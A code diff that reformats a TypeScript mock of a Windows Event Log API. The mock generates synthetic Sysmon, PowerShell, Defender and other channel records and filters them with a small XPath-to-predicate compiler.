-    data: [["FileNameLength", String(dll.length)], ["FileNameBuffer", dll], ["ProcessNameLength", String(proc.length)], ["ProcessNameBuffer", proc], ["RequestedPolicy", "8"], ["ValidatedPolicy", "1"], ["Status", "0xc0000428"]],
+    data: [
+      ["FileNameLength", String(dll.length)],
+      ["FileNameBuffer", dll],
+      ["ProcessNameLength", String(proc.length)],
+      ["ProcessNameBuffer", proc],
+      ["RequestedPolicy", "8"],
+      ["ValidatedPolicy", "1"],
+      ["Status", "0xc0000428"],
+    ],
     message:
       id === 3089
         ? "Signature information for another event. Match UMCI Event ID 3033 in log."
@@ -1159,7 +2085,12 @@ function genericMaker(channel: string): Maker {
       keywords: "0x8000000000000000",
       pid: int(r, 400, 9000) & ~3,
       sid: r() < 0.5 ? "S-1-5-18" : USER_SID,
-      data: [["Component", short], ["Operation", id >= 400 ? "Write" : "Read"], ["Duration", ms], ["Status", id >= 400 ? "0x80070005" : "0x0"]],
+      data: [
+        ["Component", short],
+        ["Operation", id >= 400 ? "Write" : "Read"],
+        ["Duration", ms],
+        ["Status", id >= 400 ? "0x80070005" : "0x0"],
+      ],
       message: msg.replace("%MS%", ms),
     };
   };
@@ -1181,7 +2112,11 @@ interface Model {
 const T0 = Date.now() - 15_000;
 const models = new Map<string, Model>();
 
-function add(name: string, kind: EventChannel["kind"], opts: { enabled?: boolean; count?: number; gap?: number; first?: number; maker?: Maker; admin?: boolean } = {}) {
+function add(
+  name: string,
+  kind: EventChannel["kind"],
+  opts: { enabled?: boolean; count?: number; gap?: number; first?: number; maker?: Maker; admin?: boolean } = {},
+) {
   const enabled = opts.enabled ?? true;
   const h = hash(name);
   const count = enabled ? (opts.count ?? 40 + (h % 500)) : (opts.count ?? 0);
@@ -1206,15 +2141,29 @@ add("Internet Explorer", "classic", { count: 0 });
 add("Key Management Service", "classic", { count: 0 });
 add("Windows PowerShell", "classic", { count: 1400, gap: 380, first: 9811, maker: legacyPowershellMaker });
 add("OAlerts", "classic", { count: 36, gap: 50000 });
-add("Microsoft-Windows-Sysmon/Operational", "operational", { count: 36000, gap: 1.6, first: 5523001, maker: sysmonMaker });
-add("Microsoft-Windows-PowerShell/Operational", "operational", { count: 6200, gap: 55, first: 40112, maker: powershellMaker });
+add("Microsoft-Windows-Sysmon/Operational", "operational", {
+  count: 36000,
+  gap: 1.6,
+  first: 5523001,
+  maker: sysmonMaker,
+});
+add("Microsoft-Windows-PowerShell/Operational", "operational", {
+  count: 6200,
+  gap: 55,
+  first: 40112,
+  maker: powershellMaker,
+});
 add("Microsoft-Windows-PowerShell/Admin", "admin", { count: 12 });
 add("PowerShellCore/Operational", "operational", { count: 900, maker: powershellMaker });
 add("Microsoft-Windows-Windows Defender/Operational", "operational", { count: 950, gap: 600, maker: defenderMaker });
 add("Microsoft-Windows-Windows Defender/WHC", "operational", { count: 30 });
 add("Microsoft-Windows-TaskScheduler/Operational", "operational", { count: 5200, gap: 30, maker: taskMaker });
 add("Microsoft-Windows-TaskScheduler/Maintenance", "operational", { count: 60 });
-add("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", "operational", { count: 320, gap: 3600, maker: rdpMaker });
+add("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", "operational", {
+  count: 320,
+  gap: 3600,
+  maker: rdpMaker,
+});
 add("Microsoft-Windows-TerminalServices-LocalSessionManager/Admin", "admin", { count: 40, maker: rdpMaker });
 add("Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational", "operational");
 add("Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin", "admin");
@@ -1311,7 +2260,14 @@ function generate(m: Model, id: number): { meta: Meta; xml: () => string } {
   const t = id > lastBase ? m.live[id - lastBase - 1] : Math.round(T0 - (lastBase - id) * m.gap * 1000 - jitter);
   const s = m.maker(r, t);
   return {
-    meta: { id, level: s.level, eventId: s.eventId, provider: s.provider, time: t, keywords: s.keywords ?? "0x80000000000000" },
+    meta: {
+      id,
+      level: s.level,
+      eventId: s.eventId,
+      provider: s.provider,
+      time: t,
+      keywords: s.keywords ?? "0x80000000000000",
+    },
     xml: () => toXml(m.ch.name, id, t, s, r),
   };
 }
@@ -1333,14 +2289,26 @@ function compile(xpath?: string): (m: Meta) => boolean {
     if (b < 0 || p < 0) throw invalid("unbalanced brackets");
   }
   if (b || p) throw invalid("unbalanced brackets");
-  if (!/^\*\s*\[/.test(s) && !/^<QueryList/i.test(s)) throw invalid(`the query must start with *[ (got "${s.slice(0, 20)}")`);
+  if (!/^\*\s*\[/.test(s) && !/^<QueryList/i.test(s))
+    throw invalid(`the query must start with *[ (got "${s.slice(0, 20)}")`);
   const m = /^\*\s*\[\s*System\s*\[([\s\S]*)\]\s*\]$/.exec(s);
   if (!m) {
     console.warn("[mock] XPath beyond the mock's subset; matching every event:", s);
     return () => true;
   }
   const js = m[1]
-    .replace(/Provider\[([^\]]*)\]/g, (_, inner: string) => "(" + inner.replace(/@Name\s*=\s*("[^"]*"|'[^']*')/g, (_x, q: string) => `m.provider===${JSON.stringify(q.slice(1, -1))}`).replace(/\bor\b/g, "||") + ")")
+    .replace(
+      /Provider\[([^\]]*)\]/g,
+      (_, inner: string) =>
+        "(" +
+        inner
+          .replace(
+            /@Name\s*=\s*("[^"]*"|'[^']*')/g,
+            (_x, q: string) => `m.provider===${JSON.stringify(q.slice(1, -1))}`,
+          )
+          .replace(/\bor\b/g, "||") +
+        ")",
+    )
     .replace(/TimeCreated\[\s*timediff\(\s*@SystemTime\s*\)\s*<=\s*(\d+)\s*\]/g, "(now-m.time<=$1)")
     .replace(/band\(\s*Keywords\s*,\s*(\d+)\s*\)/g, "band(m.keywords,$1)")
     .replace(/\bEventID\b/g, "m.eventId")
@@ -1352,7 +2320,10 @@ function compile(xpath?: string): (m: Meta) => boolean {
   const idents = js.replace(/"(?:[^"\\]|\\.)*"/g, "").match(/[A-Za-z_]\w*/g) ?? [];
   const unknown = idents.find((i) => !ALLOWED.has(i));
   if (unknown) {
-    if (/^[A-Z]/.test(unknown) && /^(Task|Opcode|Keywords|Computer|Security|Execution|EventRecordID|Channel)$/.test(unknown)) {
+    if (
+      /^[A-Z]/.test(unknown) &&
+      /^(Task|Opcode|Keywords|Computer|Security|Execution|EventRecordID|Channel)$/.test(unknown)
+    ) {
       console.warn("[mock] XPath field beyond the mock's subset; matching every event:", unknown);
       return () => true;
     }
@@ -1360,7 +2331,11 @@ function compile(xpath?: string): (m: Meta) => boolean {
   }
   if (/[^\w\s.()!&|<>=+\-"',:/\\@ {}#]/.test(js)) throw invalid("unexpected character");
   try {
-    const fn = new Function("m", "now", "band", `return (${js});`) as (m: Meta, now: number, band: (a: string, b: number) => boolean) => boolean;
+    const fn = new Function("m", "now", "band", `return (${js});`) as (
+      m: Meta,
+      now: number,
+      band: (a: string, b: number) => boolean,
+    ) => boolean;
     const band = (a: string, bits: number) => (BigInt(a) & BigInt(bits)) !== 0n;
     fn({ id: 0, level: 0, eventId: 0, provider: "", time: 0, keywords: "0x0" }, 0, band);
     return (meta) => !!fn(meta, Date.now(), band);
@@ -1437,11 +2412,23 @@ export function install() {
   installMock(
     {
       eventlog: {
-        channels: () => later([...models.values()].map((m) => m.ch), 150),
+        channels: () =>
+          later(
+            [...models.values()].map((m) => m.ch),
+            150,
+          ),
         info: async (channel: string): Promise<EventLogInfo> => {
           const m = model(channel);
           const count = m.base + m.live.length;
-          return later({ records: count, fileSize: count ? Math.ceil((count * 1180) / 65536) * 65536 : 69632, lastWrite: count ? generate(m, last(m)).meta.time : null, oldestRecord: count ? m.first : null }, 60);
+          return later(
+            {
+              records: count,
+              fileSize: count ? Math.ceil((count * 1180) / 65536) * 65536 : 69632,
+              lastWrite: count ? generate(m, last(m)).meta.time : null,
+              oldestRecord: count ? m.first : null,
+            },
+            60,
+          );
         },
         query: async (q: EventQuery): Promise<EventPage> => {
           await later(null, 120);
@@ -1449,7 +2436,15 @@ export function install() {
           const pred = compile(q.xpath);
           const reverse = q.reverse ?? true;
           const id = nextCursor++;
-          const c: Cursor = { m, lo: m.first, hi: last(m), pos: reverse ? last(m) : m.first, step: reverse ? -1 : 1, pred, text: (q.text ?? "").toLowerCase() };
+          const c: Cursor = {
+            m,
+            lo: m.first,
+            hi: last(m),
+            pos: reverse ? last(m) : m.first,
+            step: reverse ? -1 : 1,
+            pred,
+            text: (q.text ?? "").toLowerCase(),
+          };
           cursors.set(id, c);
           const page = readPage(id, c, Math.max(1, Math.min(1000, q.max ?? 200)));
           return later(page, c.text ? 150 + page.scanned / 20 : 40);
